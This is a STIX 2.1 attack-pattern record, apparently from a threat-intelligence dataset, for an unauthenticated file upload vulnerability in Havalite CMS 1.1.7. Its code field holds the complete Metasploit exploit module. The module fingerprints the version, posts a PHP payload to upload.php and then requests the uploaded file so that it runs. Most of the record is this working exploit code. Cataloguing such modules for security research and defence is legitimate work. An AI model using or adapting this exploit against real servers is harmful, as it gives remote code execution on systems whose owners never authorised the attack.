{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cc381176-bd35-406c-b360-3bf339d96100",
    "created": "2024-08-14T17:13:37.394828Z",
    "modified": "2024-08-14T17:13:37.394833Z",
    "name": "\"Havalite CMS Arbitary File Upload Vulnerability\"",
    "description": " This module exploits a file upload vulnerability found in Havalite CMS 1.1.7, and possibly prior.  Attackers can abuse the upload feature in order to upload a malicious PHP file without authentication, which results in arbitrary remote code execution.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/havalite_upload_exec.rb",
            "external_id": "havalite_upload_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::PhpEXE\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Havalite CMS Arbitary File Upload Vulnerability\",\n      'Description'    => %q{\n        This module exploits a file upload vulnerability found in Havalite CMS 1.1.7, and\n        possibly prior.  Attackers can abuse the upload feature in order to upload a\n        malicious PHP file without authentication, which results in arbitrary remote code\n        execution.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'CWH',\n          'sinn3r'  #Metasploit\n        ],\n      'References'     =>\n        [\n          ['OSVDB', '94405'],\n          ['EDB', '26243']\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\"\n        },\n      'Platform'       => %w{ linux php },\n      'Targets'        =>\n        [\n          [ 'Generic (PHP Payload)', { 'Arch' => ARCH_PHP, 'Platform' => 'php' }  ],\n          [ 'Linux x86'            , { 'Arch' => ARCH_X86, 'Platform' => 'linux'} ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2013-06-17',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('TARGETURI', [true, 'The base path to havalite', '/'])\n        ])\n  end\n\n  #\n  # Checks if target is running HavaLite CMS 1.1.7\n  # We only flag 1.1.7 as vulnerable, because we don't have enough information from\n  # the vendor or OSVDB about exactly which ones are really vulnerable.\n  #\n  def check\n    uri = normalize_uri(target_uri.path, 'havalite/')\n    res = send_request_raw({'uri' => uri})\n\n    if not res\n      vprint_error(\"Connection timed out\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    js_src = res.body.scan(/<script type=\"text\\/javascript\">(.+)<\\/script>/im).flatten[0] || ''\n    version = js_src.scan(/var myVersion = '(.+)';/).flatten[0] || ''\n\n    if not version.empty? and version =~ /1\\.1\\.7/\n      vprint_status(\"Version found: #{version}\")\n      return Exploit::CheckCode::Appears\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n\n  #\n  # Uploads our malicious file\n  #\n  def upload(base)\n    p     = get_write_exec_payload(:unlink_self=>true)\n    fname = \"#{rand_text_alpha(5)}.php\"\n\n    data = Rex::MIME::Message.new\n    data.add_part(p, \"application/octet-stream\", nil, \"form-data; name=\\\"files[]\\\"; filename=\\\"#{fname}\\\"\")\n    post_data = data.to_s\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(base, 'havalite', 'upload.php'),\n      'ctype'  => \"multipart/form-data; boundary=#{data.bound}\",\n      'data'   => post_data\n    })\n\n    if not res\n      fail_with(Failure::Unknown, \"#{peer} - Request timed out while uploading\")\n    elsif res.code.to_i == 404\n      fail_with(Failure::NotFound, \"#{peer} - No upload.php found\")\n    elsif res.body =~ /\"error\"\\:\"abort\"/\n      fail_with(Failure::Unknown, \"#{peer} - Unable to write #{fname}\")\n    end\n\n    return fname\n  end\n\n\n  #\n  # Executes our uploaded malicious file\n  #\n  def exec(base, payload_fname)\n    res = send_request_raw({\n      'uri' => normalize_uri(base, 'havalite','tmp', 'files', payload_fname)\n    })\n\n    if res and res.code == 404\n      fail_with(Failure::NotFound, \"#{peer} - Not found: #{payload_fname}\")\n    end\n  end\n\n\n  def exploit\n    base = target_uri.path\n\n    print_status(\"Uploading malicious file...\")\n    fname = upload(base)\n\n    print_status(\"Executing #{fname}...\")\n    exec(base, fname)\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-06-17",
    "x_mitre_platforms": [
        "%w{ linux php }"
    ]
}